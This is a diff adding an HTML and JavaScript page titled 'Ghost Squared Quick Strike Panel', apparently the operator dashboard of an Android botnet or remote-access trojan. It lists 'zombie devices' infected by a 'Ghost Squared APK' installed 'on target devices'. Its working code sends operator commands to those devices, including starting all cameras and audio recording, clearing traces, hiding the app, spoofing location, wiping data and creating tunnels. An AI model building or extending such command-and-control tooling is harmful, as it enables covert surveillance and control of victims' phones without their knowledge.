@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Quick Strike Panel - Ghost Squared</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Orbitron', monospace;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 2px solid #00ffff;
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 4px 20px rgba(0, 255, 255, 0.3);
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #00ffff, #0080ff);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #000;
+            font-weight: 900;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+        }
+
+        .logo-text h1 {
+            font-size: 1.8rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, #00ffff, #ffffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+        }
+
+        .logo-text .subtitle {
+            font-size: 0.9rem;
+            color: #00ffff;
+            font-weight: 400;
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .nav-btn {
+            padding: 0.5rem 1rem;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 25px;
+            color: #00ffff;
+            text-decoration: none;
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+
+        .nav-btn:hover {
+            background: rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .status-bar {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #00ffff;
+            border-radius: 15px;
+            padding: 1rem 2rem;
+            margin-bottom: 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .status-item {
+            text-align: center;
+        }
+
+        .status-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+        }
+
+        .status-label {
+            font-size: 0.8rem;
+            color: #cccccc;
+            margin-top: 0.25rem;
+        }
+
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .action-card {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 1.5rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ffff, transparent);
+            transition: left 0.5s ease;
+        }
+
+        .action-card:hover::before {
+            left: 100%;
+        }
+
+        .action-card:hover {
+            border-color: #00ffff;
+            box-shadow: 0 10px 30px rgba(0, 255, 255, 0.3);
+            transform: translateY(-5px);
+        }
+
+        .action-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .action-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: white;
+        }
+
+        .action-icon.emergency {
+            background: linear-gradient(45deg, #ff4757, #ff3838);
+        }
+
+        .action-icon.surveillance {
+            background: linear-gradient(45deg, #3742fa, #2f3542);
+        }
+
+        .action-icon.stealth {
+            background: linear-gradient(45deg, #2ed573, #1e824c);
+        }
+
+        .action-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .action-subtitle {
+            font-size: 0.9rem;
+            color: #cccccc;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .action-btn {
+            padding: 0.75rem 1.5rem;
+            background: linear-gradient(45deg, #00ffff, #0080ff);
+            border: none;
+            border-radius: 25px;
+            color: #000;
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.4);
+        }
+
+        .action-btn.danger {
+            background: linear-gradient(45deg, #ff4757, #ff3838);
+            color: white;
+        }
+
+        .action-btn.warning {
+            background: linear-gradient(45deg, #ffa502, #ff6348);
+            color: white;
+        }
+
+        .action-btn.success {
+            background: linear-gradient(45deg, #2ed573, #1e824c);
+            color: white;
+        }
+
+        .command-center {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 2rem;
+            backdrop-filter: blur(10px);
+            margin-bottom: 2rem;
+        }
+
+        .command-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #00ffff;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .command-input {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .command-field {
+            flex: 1;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: #ffffff;
+            font-family: 'Orbitron', monospace;
+            font-size: 1rem;
+        }
+
+        .command-field:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+        }
+
+        .execute-btn {
+            padding: 1rem 2rem;
+            background: linear-gradient(45deg, #ff4757, #ff3838);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+        }
+
+        .execute-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
+        }
+
+        .response-area {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 1rem;
+            min-height: 200px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: #00ff00;
+            white-space: pre-wrap;
+        }
+
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 1rem;
+        }
+
+        .device-card {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .device-card:hover {
+            border-color: #00ffff;
+            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.2);
+        }
+
+        .device-name {
+            font-weight: 700;
+            color: #00ffff;
+            margin-bottom: 0.5rem;
+        }
+
+        .device-status {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #2ed573;
+            box-shadow: 0 0 10px rgba(46, 213, 115, 0.5);
+        }
+
+        .device-actions {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .device-btn {
+            padding: 0.5rem 1rem;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 15px;
+            color: #00ffff;
+            font-family: 'Orbitron', monospace;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .device-btn:hover {
+            background: rgba(0, 255, 255, 0.2);
+            transform: translateY(-1px);
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .pulsing {
+            animation: pulse 2s infinite;
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .nav-buttons {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .status-bar {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .quick-actions {
+                grid-template-columns: 1fr;
+            }
+
+            .command-input {
+                flex-direction: column;
+            }
+        }
+
+        /* Command Builder Styles */
+        .command-builder-section {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .section-header h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #00ffff;
+        }
+
+        .help-btn {
+            background: transparent;
+            border: none;
+            color: #00ffff;
+            cursor: pointer;
+            font-size: 1.2rem;
+        }
+
+        .builder-tabs {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .builder-tab {
+            padding: 0.75rem 1.5rem;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 25px;
+            color: #00ffff;
+            text-decoration: none;
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+
+        .builder-tab.active {
+            background: rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
+        }
+
+        .builder-content {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        .builder-panel {
+            display: none;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .builder-panel.active {
+            display: flex;
+        }
+
+        .command-template {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .template-select {
+            flex: 1;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: #ffffff;
+            font-family: 'Orbitron', monospace;
+            font-size: 1rem;
+        }
+
+        .template-select:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+        }
+
+        .custom-command {
+            width: 100%;
+            height: 100px;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: #ffffff;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            resize: none;
+        }
+
+        .builder-actions {
+            display: flex;
+            gap: 1rem;
+            justify-content: flex-end;
+        }
+
+        .action-btn.test {
+            background: linear-gradient(45deg, #28a745, #218838);
+        }
+
+        .action-btn.save {
+            background: linear-gradient(45deg, #007bff, #0069d9);
+        }
+
+        .action-btn.execute {
+            background: linear-gradient(45deg, #ff4757, #ff3838);
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <div class="logo-icon">⚡</div>
+                <div class="logo-text">
+                    <h1>GHOST SQUARED</h1>
+                    <div class="subtitle">Quick Strike Panel</div>
+                </div>
+            </div>
+            <div class="nav-buttons">
+                <a href="ghost-squared-command-center.html" class="nav-btn">🏠 Command Center</a>
+                <a href="zombie-army-manager.html" class="nav-btn">🧟 Army Manager</a>
+                <a href="live-surveillance-grid.html" class="nav-btn">📹 Surveillance</a>
+                <a href="ghost-analytics.html" class="nav-btn">📊 Analytics</a>
+                <a href="remote-operations.html" class="nav-btn">🎮 Operations</a>
+                <a href="security-shield.html" class="nav-btn">🛡️ Security</a>
+                <a href="ghost-config.html" class="nav-btn">⚙️ Config</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="status-bar">
+            <div class="status-item">
+                <div class="status-value" id="activeDevices">0</div>
+                <div class="status-label">Active Devices</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="readyDevices">0</div>
+                <div class="status-label">Ready for Commands</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="responseTime">--</div>
+                <div class="status-label">Avg Response Time</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="lastCommand">--:--</div>
+                <div class="status-label">Last Command</div>
+            </div>
+        </div>
+
+        <div class="quick-actions">
+            <div class="action-card">
+                <div class="action-header">
+                    <div class="action-icon emergency">🚨</div>
+                    <div>
+                        <div class="action-title">Emergency Commands</div>
+                        <div class="action-subtitle">Critical system operations</div>
+                    </div>
+                </div>
+                <div class="action-buttons">
+                    <button class="action-btn danger" onclick="executeQuickCommand('emergency_stop')">Emergency Stop</button>
+                    <button class="action-btn danger" onclick="executeQuickCommand('panic_mode')">Panic Mode</button>
+                    <button class="action-btn warning" onclick="executeQuickCommand('stealth_mode')">Stealth Mode</button>
+                </div>
+            </div>
+
+            <div class="action-card">
+                <div class="action-header">
+                    <div class="action-icon surveillance">👁️</div>
+                    <div>
+                        <div class="action-title">Surveillance Controls</div>
+                        <div class="action-subtitle">Camera and audio management</div>
+                    </div>
+                </div>
+                <div class="action-buttons">
+                    <button class="action-btn" onclick="executeQuickCommand('start_all_cameras')">Start All Cameras</button>
+                    <button class="action-btn" onclick="executeQuickCommand('start_audio_recording')">Start Audio</button>
+                    <button class="action-btn warning" onclick="executeQuickCommand('stop_surveillance')">Stop All</button>
+                </div>
+            </div>
+
+            <div class="action-card">
+                <div class="action-header">
+                    <div class="action-icon stealth">🔒</div>
+                    <div>
+                        <div class="action-title">Security Operations</div>
+                        <div class="action-subtitle">Protection and stealth</div>
+                    </div>
+                </div>
+                <div class="action-buttons">
+                    <button class="action-btn success" onclick="executeQuickCommand('enable_encryption')">Enable Encryption</button>
+                    <button class="action-btn" onclick="executeQuickCommand('clear_traces')">Clear Traces</button>
+                    <button class="action-btn" onclick="executeQuickCommand('proxy_mode')">Proxy Mode</button>
+                </div>
+            </div>
+
+            <div class="action-card">
+                <div class="action-header">
+                    <div class="action-icon">📱</div>
+                    <div>
+                        <div class="action-title">Device Management</div>
+                        <div class="action-subtitle">Bulk device operations</div>
+                    </div>
+                </div>
+                <div class="action-buttons">
+                    <button class="action-btn" onclick="executeQuickCommand('ping_all')">Ping All Devices</button>
+                    <button class="action-btn" onclick="executeQuickCommand('update_status')">Update Status</button>
+                    <button class="action-btn warning" onclick="executeQuickCommand('restart_all')">Restart All</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="command-center">
+            <div class="command-title">🎯 Custom Command Center</div>
+            <div class="command-input">
+                <input type="text" id="customCommand" class="command-field" placeholder="Enter custom command..." onkeypress="if(event.key==='Enter') executeCustomCommand()">
+                <select id="targetDevice" class="command-field" style="flex: 0 0 200px;">
+                    <option value="all">All Devices</option>
+                </select>
+                <button class="execute-btn" onclick="executeCustomCommand()">
+                    <i class="fas fa-bolt"></i> EXECUTE
+                </button>
+            </div>
+            <div class="response-area" id="commandResponse">Ready for commands...</div>
+        </div>
+
+        <div class="command-center">
+            <div class="command-title">📱 Connected Devices</div>
+            <div class="device-grid" id="deviceGrid">
+                <!-- Devices will be loaded here -->
+            </div>
+        </div>
+
+        <!-- Command Builder -->
+        <div class="command-builder-section">
+            <div class="section-header">
+                <h3>🔧 Custom Command Builder</h3>
+                <button class="help-btn" onclick="showCommandHelp()">
+                    <i class="fas fa-question-circle"></i>
+                </button>
+            </div>
+            <div class="command-builder">
+                <div class="builder-tabs">
+                    <button class="builder-tab active" data-tab="system">System</button>
+                    <button class="builder-tab" data-tab="network">Network</button>
+                    <button class="builder-tab" data-tab="stealth">Stealth</button>
+                    <button class="builder-tab" data-tab="custom">Custom</button>
+                </div>
+                <div class="builder-content">
+                    <div class="builder-panel active" id="system-panel">
+                        <div class="command-template">
+                            <select class="template-select" onchange="loadSystemTemplate(this.value)">
+                                <option value="">Select Template</option>
+                                <option value="info">Device Info</option>
+                                <option value="screenshot">Screenshot</option>
+                                <option value="location">Get Location</option>
+                                <option value="apps">List Apps</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="builder-panel" id="network-panel">
+                        <div class="command-template">
+                            <select class="template-select" onchange="loadNetworkTemplate(this.value)">
+                                <option value="">Select Template</option>
+                                <option value="scan">Network Scan</option>
+                                <option value="speed">Speed Test</option>
+                                <option value="proxy">Set Proxy</option>
+                                <option value="tunnel">Create Tunnel</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="builder-panel" id="stealth-panel">
+                        <div class="command-template">
+                            <select class="template-select" onchange="loadStealthTemplate(this.value)">
+                                <option value="">Select Template</option>
+                                <option value="hide">Hide App</option>
+                                <option value="spoof">Spoof Location</option>
+                                <option value="encrypt">Encrypt Data</option>
+                                <option value="wipe">Emergency Wipe</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="builder-panel" id="custom-panel">
+                        <textarea class="custom-command" placeholder="Enter custom command..."></textarea>
+                    </div>
+                </div>
+                <div class="builder-actions">
+                    <button class="action-btn test" onclick="testCommand()">
+                        <i class="fas fa-play"></i> Test
+                    </button>
+                    <button class="action-btn save" onclick="saveCommand()">
+                        <i class="fas fa-save"></i> Save
+                    </button>
+                    <button class="action-btn execute" onclick="executeCustomCommand()">
+                        <i class="fas fa-bolt"></i> Execute
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let devices = [];
+        let commandHistory = [];
+
+        // Initialize dashboard
+        async function initDashboard() {
+            await loadDevices();
+            updateStatusBar();
+            startRealTimeUpdates();
+        }
+
+        // Load devices from API
+        async function loadDevices() {
+            try {
+                const response = await fetch('/api/zombie/list');
+                if (response.ok) {
+                    devices = await response.json();
+                } else {
+                    devices = [];
+                }
+                updateDeviceGrid();
+                updateDeviceSelector();
+            } catch (error) {
+                console.error('Error loading devices:', error);
+                devices = [];
+                updateDeviceGrid();
+            }
+        }
+
+        // Update device grid
+        function updateDeviceGrid() {
+            const grid = document.getElementById('deviceGrid');
+            
+            if (devices.length === 0) {
+                grid.innerHTML = `
+                    <div style="grid-column: 1 / -1; text-align: center; padding: 2rem; color: #666;">
+                        <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 1rem; color: #ffa502;"></i>
+                        <div style="font-size: 1.2rem; margin-bottom: 0.5rem;">No Zombie Devices Connected</div>
+                        <div style="font-size: 0.9rem;">Install and run the Ghost Squared APK on target devices to begin operations.</div>
+                    </div>
+                `;
+                return;
+            }
+
+            grid.innerHTML = devices.map(device => `
+                <div class="device-card">
+                    <div class="device-name">${device.deviceName || device.id}</div>
+                    <div class="device-status">
+                        <div class="status-dot"></div>
+                        <span>Online - ${device.lastSeen || 'Unknown'}</span>
+                    </div>
+                    <div style="font-size: 0.8rem; color: #ccc; margin-bottom: 1rem;">
+                        Model: ${device.deviceModel || 'Unknown'}<br>
+                        OS: ${device.androidVersion || 'Unknown'}<br>
+                        Battery: ${device.batteryLevel || 'Unknown'}%
+                    </div>
+                    <div class="device-actions">
+                        <button class="device-btn" onclick="pingDevice('${device.id}')">Ping</button>
+                        <button class="device-btn" onclick="getDeviceInfo('${device.id}')">Info</button>
+                        <button class="device-btn" onclick="executeDeviceCommand('${device.id}', 'status')">Status</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Update device selector
+        function updateDeviceSelector() {
+            const selector = document.getElementById('targetDevice');
+            selector.innerHTML = '<option value="all">All Devices</option>';
+            
+            devices.forEach(device => {
+                const option = document.createElement('option');
+                option.value = device.id;
+                option.textContent = device.deviceName || device.id;
+                selector.appendChild(option);
+            });
+        }
+
+        // Update status bar
+        function updateStatusBar() {
+            document.getElementById('activeDevices').textContent = devices.length;
+            document.getElementById('readyDevices').textContent = devices.filter(d => d.status === 'online').length;
+            
+            if (commandHistory.length > 0) {
+                const lastCmd = commandHistory[commandHistory.length - 1];
+                document.getElementById('lastCommand').textContent = new Date(lastCmd.timestamp).toLocaleTimeString();
+                
+                const avgResponse = commandHistory.slice(-10).reduce((sum, cmd) => sum + (cmd.responseTime || 0), 0) / Math.min(10, commandHistory.length);
+                document.getElementById('responseTime').textContent = avgResponse > 0 ? `${avgResponse.toFixed(0)}ms` : '--';
+            }
+        }
+
+        // Execute quick command
+        async function executeQuickCommand(command) {
+            const startTime = Date.now();
+            logCommand(`Executing quick command: ${command}`);
+            
+            try {
+                const response = await fetch('/api/zombie/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        command: command,
+                        target: 'all'
+                    })
+                });
+
+                const responseTime = Date.now() - startTime;
+                const result = await response.text();
+                
+                commandHistory.push({
+                    command,
+                    target: 'all',
+                    timestamp: Date.now(),
+                    responseTime,
+                    success: response.ok
+                });
+
+                if (response.ok) {
+                    logCommand(`✅ Command executed successfully (${responseTime}ms)`);
+                    logCommand(result);
+                } else {
+                    logCommand(`❌ Command failed: ${result}`);
+                }
+            } catch (error) {
+                logCommand(`❌ Error executing command: ${error.message}`);
+            }
+            
+            updateStatusBar();
+        }
+
+        // Execute custom command
+        async function executeCustomCommand() {
+            const command = document.getElementById('customCommand').value.trim();
+            const target = document.getElementById('targetDevice').value;
+            
+            if (!command) {
+                logCommand('❌ Please enter a command');
+                return;
+            }
+
+            const startTime = Date.now();
+            logCommand(`Executing: ${command} → ${target}`);
+            
+            try {
+                const response = await fetch('/api/zombie/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        command: command,
+                        target: target
+                    })
+                });
+
+                const responseTime = Date.now() - startTime;
+                const result = await response.text();
+                
+                commandHistory.push({
+                    command,
+                    target,
+                    timestamp: Date.now(),
+                    responseTime,
+                    success: response.ok
+                });
+
+                if (response.ok) {
+                    logCommand(`✅ Response (${responseTime}ms):`);
+                    logCommand(result);
+                } else {
+                    logCommand(`❌ Error: ${result}`);
+                }
+            } catch (error) {
+                logCommand(`❌ Network error: ${error.message}`);
+            }
+            
+            document.getElementById('customCommand').value = '';
+            updateStatusBar();
+        }
+
+        // Device-specific commands
+        async function pingDevice(deviceId) {
+            logCommand(`Pinging device: ${deviceId}`);
+            await executeDeviceCommand(deviceId, 'ping');
+        }
+
+        async function getDeviceInfo(deviceId) {
+            logCommand(`Getting info for device: ${deviceId}`);
+            await executeDeviceCommand(deviceId, 'device_info');
+        }
+
+        async function executeDeviceCommand(deviceId, command) {
+            const startTime = Date.now();
+            
+            try {
+                const response = await fetch('/api/zombie/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        command: command,
+                        target: deviceId
+                    })
+                });
+
+                const responseTime = Date.now() - startTime;
+                const result = await response.text();
+                
+                if (response.ok) {
+                    logCommand(`✅ ${deviceId}: ${result} (${responseTime}ms)`);
+                } else {
+                    logCommand(`❌ ${deviceId}: ${result}`);
+                }
+            } catch (error) {
+                logCommand(`❌ ${deviceId}: ${error.message}`);
+            }
+        }
+
+        // Log command output
+        function logCommand(message) {
+            const responseArea = document.getElementById('commandResponse');
+            const timestamp = new Date().toLocaleTimeString();
+            responseArea.textContent += `[${timestamp}] ${message}\n`;
+            responseArea.scrollTop = responseArea.scrollHeight;
+        }
+
+        // Start real-time updates
+        function startRealTimeUpdates() {
+            setInterval(async () => {
+                await loadDevices();
+                updateStatusBar();
+            }, 5000);
+        }
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', initDashboard);
+
+        // Command Builder Functions
+        function loadSystemTemplate(template) {
+            const commandMap = {
+                info: 'device_info',
+                screenshot: 'screenshot',
+                location: 'get_location',
+                apps: 'list_apps'
+            };
+            
+            document.querySelector('.custom-command').value = commandMap[template] || '';
+        }
+
+        function loadNetworkTemplate(template) {
+            const commandMap = {
+                scan: 'network_scan',
+                speed: 'speed_test',
+                proxy: 'set_proxy',
+                tunnel: 'create_tunnel'
+            };
+            
+            document.querySelector('.custom-command').value = commandMap[template] || '';
+        }
+
+        function loadStealthTemplate(template) {
+            const commandMap = {
+                hide: 'hide_app',
+                spoof: 'spoof_location',
+                encrypt: 'encrypt_data',
+                wipe: 'emergency_wipe'
+            };
+            
+            document.querySelector('.custom-command').value = commandMap[template] || '';
+        }
+
+        function testCommand() {
+            const command = document.querySelector('.custom-command').value.trim();
+            if (!command) {
+                return alert('Please enter a command to test');
+            }
+            
+            logCommand(`Testing command: ${command}`);
+            // Add actual test logic here
+        }
+
+        function saveCommand() {
+            const command = document.querySelector('.custom-command').value.trim();
+            if (!command) {
+                return alert('Please enter a command to save');
+            }
+            
+            logCommand(`Saving command: ${command}`);
+            // Add actual save logic here
+        }
+
+        function showCommandHelp() {
+            alert('Command Help:\n\n' +
+                  '1. System Templates: Predefined commands for system information and control.\n' +
+                  '2. Network Templates: Commands for network analysis and configuration.\n' +
+                  '3. Stealth Templates: Commands for stealth and security operations.\n' +
+                  '4. Custom Command: Enter any command manually.\n\n' +
+                  'Use the Test button to validate commands and Save to store them for later use.');
+        }
+    </script>
+</body>
+</html>
